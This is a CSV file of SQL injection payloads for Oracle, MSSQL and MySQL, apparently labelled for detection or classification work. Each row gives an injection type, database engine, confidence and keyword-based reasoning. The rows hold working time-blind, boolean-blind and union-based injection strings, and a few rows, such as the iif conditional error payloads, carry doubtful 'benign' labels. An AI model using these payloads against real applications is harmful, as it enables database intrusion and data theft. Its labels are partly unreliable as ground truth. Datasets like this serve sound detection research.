id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
602,"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'xngr' = 'xngr",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
755,"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'cimm' like 'cimm",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
789,"1%"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""%"" = """,time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
799,"1"" ) where 1673 = 1673 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
644,"1"" ) waitfor delay '0:0:5' and ( ""hhzy"" like ""hhzy",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
654,1 ) ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
695,"iif ( 2452 = 8999,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
699,"waitfor delay '0:0:5' and ( ""ludp"" like ""ludp",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
722,"iif ( 9190 = 5059,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
735,"-1425"" ) where 8056 = 8056 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
603,"-6514 ) ) as pbgg where 6841 = 6841 union all select 6841,6841,6841,6841--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
606,1' ) and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
614,"-4056"" ) ) ) union all select 4363,4363,4363,4363,4363,4363,4363,4363#",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
615,"-5207"" where 2050 = 2050 union all select 2050,2050,2050,2050,2050,2050,2050--",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
618,"-1339 ) ) ) union all select 2938,2938,2938,2938,2938,2938#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
619,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
622,"-5910%' ) ) ) union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--",union_based,generic,0.7,UNION-based payload detected. Payload length: 82 chars.,2
623,"1"" where 4808 = 4808 union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
624,-7940' ) union all select 6024--,union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
625,"1"" ) where 2758 = 2758 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
627,"1%"" ) ) ) union all select null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
630,"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
631,"-9622' union all select 7208,7208,7208,7208#",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
633,"1"" ) where 9285 = 9285 and 8506 = 8343#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
635,-6200%' ) ) or 8077 = 4661,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
642,1 ) ) as sfan where 7176 = 7176 and 7017 = 7358,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 47 chars.,2
649,"-9958"" ) as jzvq where 3741 = 3741 union all select 3741,3741,3741#",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
651,"-7794"" ) union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
656,-9336' or 5641 = 9488#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
660,"1"" ) union all select null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 27 chars.,2
661,"-3955%' ) ) union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
